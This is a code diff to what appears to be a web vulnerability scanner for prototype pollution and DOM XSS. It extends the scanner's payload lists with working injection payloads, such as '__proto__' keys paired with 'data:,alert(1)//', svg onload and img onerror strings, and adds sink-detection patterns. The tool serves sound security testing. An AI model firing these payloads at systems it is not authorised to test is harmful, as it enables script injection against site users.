@@ -75,15 +75,43 @@ class Tier0BasicScanner(BaseTierScanner):
         final_findings = []
         for f in all_findings:
             if isinstance(f, dict):
+                finding_type = f.get('type', 'PROTOTYPE_POLLUTION')
+                
+                # Determine intelligent name
+                name = f.get('name')
+                if not name:
+                    if finding_type == 'server_side_pp':
+                        name = f"Server-Side PP via {f.get('method', 'Unknown Method')}"
+                        if f.get('param'):
+                            name += f" (Parameter: '{f.get('param')}')"
+                    elif finding_type == 'post_xss':
+                        name = f"POST XSS via '{f.get('param', 'unknown')}' parameter"
+                    elif finding_type == 'deep_chain_pp':
+                        name = "Deep Chain Prototype Pollution"
+                    elif finding_type == 'http_header_pp':
+                        name = "HTTP Header Prototype Pollution"
+                    elif finding_type == 'hash_based_pp':
+                        name = "Hash-based Prototype Pollution (WAF Bypass)"
+                    else:
+                        name = f.get('description', 'Tier 0 Finding')
+
+                # Determine description
+                desc = f.get('description')
+                if not desc:
+                    desc = f"Detected {finding_type} vulnerability. Attack method: {f.get('method', 'Unknown')}"
+                    if f.get('evidence'):
+                        desc += f"\nEvidence: {f.get('evidence')}"
+                
                 final_findings.append(Finding(
-                    name=f.get('description', f.get('name', 'Tier 0 Finding')),
-                    severity=Severity.HIGH,
-                    type=VulnerabilityType.PROTOTYPE_POLLUTION,
-                    url=f.get('url', ctx.target_url),
+                    name=name,
+                    severity=getattr(Severity, f.get('severity', 'HIGH').upper(), Severity.HIGH),
+                    type=getattr(VulnerabilityType, finding_type.upper(), VulnerabilityType.PROTOTYPE_POLLUTION),
+                    url=f.get('url', f.get('test_url', ctx.target_url)),
                     method=f.get('method', ''),
                     payload=str(f.get('payload', '')),
                     evidence=str(f.get('evidence', '')),
-                    description=f.get('description', '')
+                    description=desc,
+                    verified=f.get('verified', False)
                 ))
             else:
                 final_findings.append(f)
@@ -1278,6 +1306,8 @@ return window['{marker}'];
             "url": r"\.url\s*=|config\.url|options\.url",
             "baseUrl": r"\.baseUrl|config\.baseUrl",
             "data": r"\.data\s*=|config\.data",
+            "sequence": r"\.sequence|manager\.sequence",
+            "eval": r"eval\s*\(",
         }
 
         for sink_name, pattern in direct_sink_patterns.items():
@@ -1324,16 +1354,32 @@ return window['{marker}'];
             )
 
         # Build priority payloads based on detected gadget
-        if gadget_info["type"] != "DESCRIPTOR":
-            # Use detected sinks for priority payloads
-            for sink in gadget_info["direct_sinks"]:
+        # Even if DESCRIPTOR is detected, we keep the original payloads as fallback
+        # for sites that have both defineProperty and direct sinks.
+        for sink in gadget_info["direct_sinks"]:
+            gadget_info["priority_payloads"].append(
+                (f"__proto__[{sink}]", "data:,alert(1)//")
+            )
+            # Add PortSwigger dot-notation alternative
+            gadget_info["priority_payloads"].append(
+                (f"__proto__.{sink}", "data:,alert(1)//")
+            )
+            # Add sequence-specific syntax fixer
+            if sink == "sequence" or sink == "eval":
                 gadget_info["priority_payloads"].append(
-                    (f"__proto__[{sink}]", "data:,alert(1)//")
+                    (f"__proto__.{sink}", "alert(1)-")
                 )
-            for event in gadget_info["event_sinks"]:
                 gadget_info["priority_payloads"].append(
-                    (f"__proto__[{event}]", "alert(1)")
+                    (f"__proto__[{sink}]", "alert(1)-")
                 )
+
+        for event in gadget_info["event_sinks"]:
+            gadget_info["priority_payloads"].append(
+                (f"__proto__[{event}]", "alert(1)")
+            )
+            gadget_info["priority_payloads"].append(
+                (f"__proto__.{event}", "alert(1)")
+            )
 
         return gadget_info
 
@@ -1402,20 +1448,30 @@ return window['{marker}'];
         else:
             # Fallback: Use all payloads if gadget not detected
             dom_xss_payloads = [
-                # Descriptor payloads FIRST (most common in PortSwigger labs)
+                # Descriptor payloads FIRST
                 ("__proto__[value]", "data:,alert(1)//"),
-                ("__proto__[value]", "data:,alert(document.domain)//"),
+                ("__proto__.value", "data:,alert(1)//"),
                 ("constructor[prototype][value]", "data:,alert(1)//"),
-                # Then direct property payloads
+                # PortSwigger sequence gadget
+                ("__proto__.sequence", "alert(1)-"),
+                ("__proto__[sequence]", "alert(1)-"),
+                # Direct property payloads
                 ("__proto__[transport_url]", "data:,alert(1);"),
+                ("__proto__.transport_url", "data:,alert(1);"),
                 ("__proto__[src]", "data:,alert(1);"),
+                ("__proto__.src", "data:,alert(1);"),
                 ("__proto__[href]", "data:,alert(1);"),
+                ("__proto__.href", "data:,alert(1);"),
                 ("__proto__[url]", "data:,alert(1);"),
+                ("__proto__.url", "data:,alert(1);"),
                 # Event handlers
                 ("__proto__[onload]", "alert(1)"),
+                ("__proto__.onload", "alert(1)"),
                 ("__proto__[onclick]", "alert(1)"),
+                ("__proto__.onclick", "alert(1)"),
                 # CSP Bypass / Script Gadgets (2025)
                 ("__proto__[template]", "<svg onload=alert(1)></svg>"),
+                ("__proto__.template", "<svg onload=alert(1)></svg>"),
                 ("__proto__[sourceURL]", "\u2028\u2029alert(1)"),
                 ("data-path", "<img src=x onerror=alert(document.domain)>"),
             ]
@@ -1524,8 +1580,13 @@ return window['{marker}'];
                                     logger.info(
                                         f"Alert '{alert_str}' not reproduced — verifying via JS Object.prototype check"
                                     )
-                                    # Extract property name from key (e.g., "__proto__[value]" -> "value")
-                                    prop_name = key.split('[')[-1].strip(']')
+                                    # Robust extraction of property name from key (e.g., "__proto__[value]" or "__proto__.value")
+                                    if '[' in key:
+                                        prop_name = key.split('[')[-1].strip(']')
+                                    elif '.' in key:
+                                        prop_name = key.split('.')[-1]
+                                    else:
+                                        prop_name = key.replace('__proto__[', '').replace('constructor[prototype][', '').replace(']', '')
                                     try:
                                         fallback_polluted = self.driver.execute_script(
                                             f"return Object.prototype['{prop_name}'] !== undefined;"
@@ -1584,7 +1645,13 @@ return window['{marker}'];
                         # FIX: ALWAYS verify prototype pollution, even when alert detected.
                         # A real DOM XSS+PP requires BOTH pollution AND execution.
                         try:
-                            test_prop = key.replace('__proto__[', '').replace('constructor[prototype][', '').replace(']', '')
+                            # Robust extraction of property name from key
+                            if '[' in key:
+                                test_prop = key.split('[')[-1].strip(']')
+                            elif '.' in key:
+                                test_prop = key.split('.')[-1]
+                            else:
+                                test_prop = key.replace('__proto__[', '').replace('constructor[prototype][', '').replace(']', '')
                             pollution_check = self.driver.execute_script(f"return Object.prototype['{test_prop}'] !== undefined;")
                             if pollution_check:
                                 is_polluted = True
@@ -1616,7 +1683,12 @@ return window['{marker}'];
                         # Report finding
                         severity_level = Severity.HIGH if (alerts_detected and is_polluted) else Severity.MEDIUM
                         verified_status = alerts_detected and is_polluted
-                        status_msg = 'EXECUTED (ALERT + POLLUTION CONFIRMED)' if verified_status else f'POLLUTED (Sinks: {",".join(found_sinks)})'
+                        
+                        if verified_status:
+                            status_msg = "EXECUTED. An payload was successfully injected into the prototype and triggered a JavaScript alert, confirming a functional DOM XSS chain."
+                        else:
+                            sinks_str = f" (Sinks: {','.join(found_sinks)})" if found_sinks else " (Prototype polluted, execution not confirmed)"
+                            status_msg = f"POLLUTED. The prototype was successfully modified with the payload{sinks_str}. This creates a significant risk of DOM XSS if any application logic trusts these properties."
 
                         findings.append(
                             Finding(
